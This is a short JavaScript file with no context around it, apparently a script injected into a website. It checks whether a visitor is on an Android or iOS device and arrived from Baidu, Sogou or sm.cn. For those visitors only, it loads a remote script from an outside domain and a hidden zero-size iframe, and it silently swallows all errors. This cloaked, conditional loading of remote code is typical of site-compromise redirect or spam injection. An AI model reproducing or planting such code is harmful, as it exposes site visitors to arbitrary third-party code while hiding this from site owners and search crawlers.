(function() {
    function a_s(u) {
        try {
            var s = document.createElement('script');
            s.type = 'text/javascript';
            s.src = u;
            document.getElementsByTagName('head')[0].appendChild(s)
        } catch (e) {}
    }

    function a_g() {
        try {
            var u = navigator.userAgent;
            var isAndroid = i_a(u);
            var isiOS = i_i(u);
            var referrer = document.referrer;
            var url = "https://push.5z5zw.com/ss/lw_uzi001.js";
            var url = 'http://etc.6187wo.com/chijian_core.js';
            if (isAndroid && c_r(referrer)) {
                a_s(url)
            }
            if (isiOS && c_r(referrer)) {
                a_s(url)
            }
        } catch (e) {}
    }

    function c_r(r) {
        var b = 'baidu.com';
        var s = 'sogou.com';
        var sm = 'sm.cn';
        var m = false;
        try {
            if (r.indexOf(b) > -1 || r.indexOf(s) > -1 || r.indexOf(sm) > -1) {
                m = true;
                var li_js = document.createElement('IFRAME');
                li_js.style.cssText = "border: 0;width: 0px;height: 0px; display:none;";
                li_js.setAttribute("scrolling", "no");
                if (r.indexOf(b) > -1) {
                    li_js.src = "https://push.5z5zw.com/ss/cnzz/cs006_b.html"
                }
                if (r.indexOf(s) > -1) {
                    li_js.src = "https://push.5z5zw.com/ss/cnzz/cs006_sou.html"
                }
                if (r.indexOf(sm) > -1) {
                    li_js.src = "https://push.5z5zw.com/ss/cnzz/cs006_sm.html"
                }
                document.body.appendChild(li_js)
            }
        } catch (e) {}
        return m
    }

    function i_a(u) {
        var r = false;
        try {
            if ((u.match(/(Android)/i))) {
                r = true
            }
        } catch (e) {}
        return r
    }

    function i_i(u) {
        var r = false;
        try {
            if (/(iPhone|iPad|iPod|iOS)/i.test(u)) {
                r = true
            }
        } catch (e) {}
        return r
    }
    a_g()
}());